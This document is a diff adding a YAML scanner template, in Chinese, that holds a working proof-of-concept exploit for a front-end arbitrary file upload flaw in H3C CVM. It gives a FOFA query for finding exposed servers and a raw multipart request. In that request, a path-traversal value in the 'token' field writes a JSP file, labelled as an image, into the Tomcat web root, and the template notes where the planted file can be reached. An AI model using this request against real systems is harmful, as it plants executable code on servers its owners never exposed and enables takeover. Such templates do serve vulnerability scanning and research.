@@ -1,0 +1,53 @@
+id: poc-brbev2n9ftneqfx0
+info:
+  name: H3C CVM fileUploadfd前台任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/brbev2n9ftneqfx0'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: brbev2n9ftneqfx0
+    fofa: server="H3C-CVM"
+http:
+- raw:
+  - 'POST /cas/fileUpload/fd HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    Connection: close
+
+    Content-Type: multipart/form-data; boundary=a4d7586ac9d50625dee11e86fa69bc71
+
+    Content-Length: 217
+
+
+    --a4d7586ac9d50625dee11e86fa69bc71
+
+    Content-Disposition: form-data; name="token"
+
+
+    /../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/stc11.jsp
+
+    --a4d7586ac9d50625dee11e86fa69bc71
+
+    Content-Disposition: form-data; name="file"; filename="123.jsp"
+
+    Content-Type: image/png
+
+
+    <% out.println("215882935");%>
+
+    --a4d7586ac9d50625dee11e86fa69bc71--
+
+
+    上传定位：http://ip/cas/js/lib/buttons/stc11.jsp'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
